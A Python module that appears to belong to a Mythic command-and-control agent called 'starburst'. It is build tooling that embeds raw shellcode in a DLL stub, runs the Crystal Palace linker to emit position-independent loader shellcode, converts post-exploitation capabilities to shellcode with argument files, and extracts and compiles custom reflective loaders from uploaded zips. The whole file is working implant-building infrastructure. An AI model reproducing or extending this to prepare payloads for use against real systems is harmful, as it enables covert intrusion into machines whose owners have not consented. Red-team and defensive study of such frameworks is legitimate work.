import os
import asyncio
import shutil
import tempfile
import subprocess
import logging

from mythic_container.MythicRPC import *

logger = logging.getLogger("starburst.crystal_utilities")

AGENT_CODE_PATH = os.path.join(os.path.dirname(__file__), "agent_code")
LOADERS_PATH = os.path.join(os.path.dirname(__file__), "..", "loaders", "crystal-palace")
STUB_SRC = os.path.join(os.path.dirname(__file__), "..", "loaders", "sc_stub.c")


def _find_tool(prefixed_name, fallback_name, search_dirs=None):
    path = shutil.which(prefixed_name)
    if path:
        return path
    if search_dirs:
        for d in search_dirs:
            candidate = os.path.join(d, prefixed_name + ".exe")
            if os.path.isfile(candidate):
                return candidate
            candidate = os.path.join(d, fallback_name + ".exe")
            if os.path.isfile(candidate):
                return candidate
    path = shutil.which(fallback_name)
    if path:
        return path
    return prefixed_name


_MSYS2_X64 = ["C:\\msys64\\mingw64\\bin"]
_MSYS2_X86 = ["C:\\msys64\\mingw32\\bin"]

CC_X64 = _find_tool("x86_64-w64-mingw32-gcc", "gcc", _MSYS2_X64)
CC_X86 = _find_tool("i686-w64-mingw32-gcc", "gcc", _MSYS2_X86)
LD_X64 = _find_tool("x86_64-w64-mingw32-ld", "ld", _MSYS2_X64)
LD_X86 = _find_tool("i686-w64-mingw32-ld", "ld", _MSYS2_X86)
OBJCOPY_X64 = _find_tool("x86_64-w64-mingw32-objcopy", "objcopy", _MSYS2_X64)
OBJCOPY_X86 = _find_tool("i686-w64-mingw32-objcopy", "objcopy", _MSYS2_X86)


def get_crystal_linker_path():
    return os.path.join(LOADERS_PATH, "crystal-linker")


def is_crystal_palace_available():
    linker_path = get_crystal_linker_path()
    jar_file = os.path.join(linker_path, "crystalpalace.jar")
    return os.path.exists(jar_file)


def _toolchain_env(cc_path):
    env = os.environ.copy()
    tooldir = os.path.dirname(cc_path)
    if tooldir:
        env["PATH"] = tooldir + os.pathsep + env.get("PATH", "")
    return env


def _wrap_shellcode_in_dll(shellcode_bytes, arch, tmpdir):
    sc_bin = os.path.join(tmpdir, "payload.bin")
    sc_obj = os.path.join(tmpdir, "payload.o")
    stub_obj = os.path.join(tmpdir, "stub.o")
    dll_path = os.path.join(tmpdir, "stub.dll")

    with open(sc_bin, "wb") as f:
        f.write(shellcode_bytes)

    cc = CC_X64 if arch == "x64" else CC_X86
    ld = LD_X64 if arch == "x64" else LD_X86
    objcopy = OBJCOPY_X64 if arch == "x64" else OBJCOPY_X86
    env = _toolchain_env(cc)

    proc = subprocess.run(
        [ld, "-r", "-b", "binary", "-o", sc_obj, "payload.bin"],
        cwd=tmpdir, capture_output=True, text=True, timeout=30, env=env,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"ld binary embed failed: {proc.stderr}")

    proc = subprocess.run(
        [cc, "-c", "-O1", "-o", stub_obj, STUB_SRC],
        capture_output=True, text=True, timeout=30, env=env,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"stub compile failed: {proc.stderr}")

    sym_prefix = "_binary_payload_bin_"
    cdecl_prefix = "_" if arch == "x86" else ""

    for old_sym, new_sym in [
        (sym_prefix + "start", cdecl_prefix + "sc_payload"),
        (sym_prefix + "end", cdecl_prefix + "sc_payload_end"),
    ]:
        proc = subprocess.run(
            [objcopy, "--redefine-sym", f"{old_sym}={new_sym}", sc_obj],
            capture_output=True, text=True, timeout=30, env=env,
        )
        if proc.returncode != 0:
            raise RuntimeError(f"objcopy redefine failed: {proc.stderr}")

    link_flags = [cc, "-shared", "-nostartfiles", "-e", "DllMain",
                   "-o", dll_path, stub_obj, sc_obj, "-lkernel32"]
    if arch == "x86":
        link_flags.insert(-1, "-Wl,--enable-stdcall-fixup")

    proc = subprocess.run(
        link_flags,
        capture_output=True, text=True, timeout=30, env=env,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"DLL link failed: {proc.stderr}")

    return dll_path


async def link_shellcode_with_cp(shellcode_bytes, arch="x64", loader_path=None, use_dll_stub=False):
    if loader_path is None:
        loader_path = os.path.join(LOADERS_PATH, "default")

    crystal_linker = get_crystal_linker_path()
    spec_file = os.path.join(loader_path, "loader.spec")

    if not os.path.exists(spec_file):
        raise FileNotFoundError(f"loader.spec not found at {spec_file}")

    with tempfile.TemporaryDirectory() as tmpdir:
        out_path = os.path.join(tmpdir, f"out.{arch}.bin")
        jar_path = os.path.join(crystal_linker, "crystalpalace.jar")

        if use_dll_stub:
            dll_path = _wrap_shellcode_in_dll(shellcode_bytes, arch, tmpdir)
            command = [
                "java", "-jar", jar_path, "link", spec_file, dll_path, out_path,
            ]
        else:
            sc_path = os.path.join(tmpdir, "payload.bin")
            with open(sc_path, "wb") as f:
                f.write(shellcode_bytes)
            command = [
                "java", "-jar", jar_path, "build", spec_file, arch, out_path,
                f"%SHELLCODE={sc_path}",
            ]

        proc = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=crystal_linker,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode != 0:
            raise RuntimeError(
                f"Crystal Palace failed (rc={proc.returncode}):\n"
                f"stdout: {stdout.decode()}\n"
                f"stderr: {stderr.decode()}"
            )

        if not os.path.exists(out_path):
            raise FileNotFoundError(f"Crystal Palace produced no output at {out_path}")

        with open(out_path, "rb") as f:
            return f.read()


async def convert_postex_to_pic(file_id, args_data=None, arch="x64", agent_uuid=None):
    crystal_linker = get_crystal_linker_path()
    post_ex_path = os.path.join(LOADERS_PATH, "post-ex")

    if agent_uuid:
        custom_path = os.path.join(LOADERS_PATH, f"postex_{agent_uuid}")
        if os.path.exists(custom_path):
            post_ex_path = custom_path
            logger.info(f"Using custom post-ex loader for {agent_uuid}")

    file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=file_id,
    ))

    if not file_resp.Success:
        raise RuntimeError(f"Failed to get file: {file_resp.Error}")

    with tempfile.TemporaryDirectory() as tmpdir:
        sc_path = os.path.join(tmpdir, "payload.bin")
        args_path = os.path.join(tmpdir, "args.bin")
        out_path = os.path.join(tmpdir, f"out.{arch}.bin")

        with open(sc_path, "wb") as f:
            f.write(file_resp.Content)

        if args_data:
            with open(args_path, "wb") as f:
                f.write(args_data + b"\x00")
        else:
            with open(args_path, "wb") as f:
                f.write(b"\x00")

        spec_file = os.path.join(post_ex_path, "loader.spec")
        jar_path = os.path.join(crystal_linker, "crystalpalace.jar")
        command = ["java", "-jar", jar_path, "link", spec_file, sc_path, out_path, f"%ARGFILE={args_path}"]

        proc = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=crystal_linker,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode != 0:
            raise RuntimeError(
                f"Crystal Palace post-ex link failed (rc={proc.returncode}):\n"
                f"stdout: {stdout.decode()}\n"
                f"stderr: {stderr.decode()}"
            )

        with open(out_path, "rb") as f:
            return f.read()


async def install_custom_postex_udrl(udrl_zip_bytes, payload_uuid, arch="x64"):
    import zipfile
    import io

    custom_path = os.path.join(LOADERS_PATH, f"postex_{payload_uuid}")
    os.makedirs(custom_path, exist_ok=True)

    zip_buf = io.BytesIO(udrl_zip_bytes)
    with zipfile.ZipFile(zip_buf, 'r') as z:
        z.extractall(custom_path)

    make_proc = await asyncio.create_subprocess_shell(
        "make",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=custom_path,
    )
    stdout, stderr = await make_proc.communicate()

    if make_proc.returncode != 0:
        raise RuntimeError(
            f"Custom post-ex UDRL compilation failed:\n"
            f"stdout: {stdout.decode()}\n"
            f"stderr: {stderr.decode()}"
        )

    logger.info(f"Installed custom post-ex UDRL for payload {payload_uuid}")
    return custom_path
